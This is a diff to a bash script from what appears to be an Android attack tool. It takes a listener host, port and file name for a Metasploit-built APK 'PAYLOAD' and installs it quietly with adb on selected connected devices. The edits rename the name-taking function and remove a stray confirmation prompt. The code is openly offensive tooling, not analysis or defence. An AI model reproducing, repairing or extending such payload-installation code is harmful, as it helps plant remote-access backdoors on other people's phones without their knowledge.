@@ -96,7 +96,7 @@ apk_install () {
         echo -e "\e[1;92mINSTALLING THE PAYLOAD\n"
         if [ "$to_install" == "0" ]
             then
-                adb -s $devv install -r $PWD/metasploit/$apk_name.apk &> /dev/null
+                adb -s $devv install -r $PWD/metasploit/$name_taker.apk &> /dev/null
                 if [ "$?" == "0" ]
                     then
                         echo -e "\n\e[1;92mSuccessfully installed the 'apk' into device $modd\n"
@@ -115,14 +115,6 @@ start_listner () {
 
 }
 
-while true; do
-  read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/N) \e[91;1m? : \e[1;93m' yn
-  case $yn in
-  [Yy]* ) break;;
-  [Nn]* ) clear && bash modules/function2.sh;;
-  * ) echo -e "\e[1;93mPlease answer it with\e[1;97m ( Y/N )\e[0m";;
-  esac
-done
 
 dev_1_payload_create () {
 
@@ -130,7 +122,7 @@ dev_1_payload_create () {
                 model=$(echo $mod_1)
                 lhost_taker
                 lport_taker
-                apk_name
+                name_taker
                 while true; do
                   read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
@@ -155,7 +147,7 @@ dev_2_payload_create () {
                 model=$(echo $mod_2)
                 lhost_taker
                 lport_taker
-                apk_name
+                name_taker
                 while true; do
                   read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
@@ -180,7 +172,7 @@ dev_3_payload_create () {
                 model=$(echo $mod_3)
                 lhost_taker
                 lport_taker
-                apk_name
+                name_taker
                 while true; do
                   read -p $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (Y/n) \e[91;1m? : \e[1;93m' yn
                   case $yn in
